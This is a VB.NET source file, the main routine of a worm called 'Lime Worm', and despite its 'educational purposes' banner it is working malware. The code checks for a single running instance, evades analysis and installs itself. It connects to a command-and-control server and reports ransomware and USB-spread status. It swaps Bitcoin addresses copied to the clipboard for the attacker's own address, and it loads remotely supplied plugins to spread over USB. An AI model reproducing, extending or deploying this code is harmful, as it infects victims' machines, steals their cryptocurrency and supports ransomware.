
'##################################################################
'##        N Y A N   C A T  |||   Updated on May./08/2018        ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                     .. Lime Worm v0.5.8B ..                   ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##    This project was created for educational purposes only    ##
'##################################################################
'##           https://github.com/NYAN-x-CAT/Lime-Worm            ##
'##################################################################
'##  This software's main purpose is NOT to be used maliciously  ##
'##################################################################
'## I am not responsible For any actions caused by this software ##
'##################################################################


Imports System.Threading

Public Class C_Main
    Public Shared C As New C_Socket
    Public Shared SPL = C_Settings.SPL

    Public Shared Sub Main()

        'If Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\" & C_ID.HWID) Is Nothing Then
        'Thread.Sleep(35000) '[New client infected]
        'End If

        Thread.Sleep(1000)

        Dim createdNew As Boolean 'Making sure that only 1 process is running
        C_Settings.NMT = New Mutex(True, C_Settings.MTX, createdNew)
        Try
            If Not createdNew Then End
        Finally
            If createdNew Then
                C_Settings.NMT.ReleaseMutex()
            End If
        End Try

        If C_Settings.ANTI Then
            Call Anti()
        End If

        Call C_Installation.INS()

        C_Socket.T1.Start() 'Start TCP connection to server

        If C_Settings.BTC_ADDR.Length > 25 Then
            Dim _BTC As Thread = New Thread(AddressOf _BTC_ST)
            _BTC.SetApartmentState(ApartmentState.STA)
            _BTC.Start()
        End If

        If C_Settings.USB Then
            Dim _USB As Thread = New Thread(AddressOf StartSP)
            _USB.Start()
        End If

        If C_Settings.PIN Then
            Dim _PIN As Thread = New Thread(AddressOf StartPIN)
            _PIN.Start()
        End If

        Dim CHK As Thread = New Thread(AddressOf Checking)
        CHK.Start()

    End Sub

#Region "Loops"

    Private Shared Sub Checking()
        Thread.CurrentThread.Sleep(5000)
        Dim Old As String = GTV("Rans-Status")
        Dim Old2 As String = GTV("USB")

1:
        Try
            While True
                If C.CNT = True Then
                    Thread.CurrentThread.Sleep(3000)
                    'Compare old string with new string            
                    If Old <> GTV("Rans-Status").ToString Then
                        Old = GTV("Rans-Status")
                        C.Send("!R" & SPL & GTV("Rans-Status").ToString)
                    End If

                    If C_Settings.USB Then
                        If Old2 <> GTV("USB").ToString Then
                            Old2 = GTV("USB")
                            C.Send("!U" & SPL & GTV("USB").ToString)
                        End If
                    End If
                Else
                    Thread.CurrentThread.Sleep(5000)
                End If
            End While
        Catch ex As Exception
            GoTo 1
        End Try

    End Sub

    Private Shared Sub _BTC_ST()
        While True
            Try

                Thread.CurrentThread.Sleep(1000)

                'checking if clipboard contains bitcoin address, the address always starts with 1 or 3 or bc1
                'the length is between 26-35 characters
                'more info https://en.bitcoin.it/wiki/Address

                If My.Computer.Clipboard.GetText.Length >= 26 AndAlso My.Computer.Clipboard.GetText.Length <= 35 Then
                    If My.Computer.Clipboard.GetText.StartsWith("1") Or My.Computer.Clipboard.GetText.StartsWith("3") Or My.Computer.Clipboard.GetText.StartsWith("bc1") Then
                        My.Computer.Clipboard.SetText(C_Settings.BTC_ADDR)
                    End If
                End If
            Catch ex As Exception
            End Try
        End While
    End Sub

    Private Shared Sub StartSP()
        If GTV("_USB") = Nothing Then
            While True
                If C.CNT = True Then
                    Thread.CurrentThread.Sleep(9000)
                    C.Send("PLUSB")
                    Exit While
                End If
            End While

        Else
            C_Commands.Plugin(Convert.FromBase64String(GTV("_USB")))
        End If
    End Sub

    Private Shared Sub StartPIN()
        If GTV("_PIN") = Nothing Then
            While True
                If C.CNT = True Then
                    Thread.CurrentThread.Sleep(11000)
                    C.Send("PLPIN")
                    Exit While
                End If
            End While

        Else
            C_Commands.Plugin(Convert.FromBase64String(GTV("_PIN")))
        End If
    End Sub

#End Region

End Class

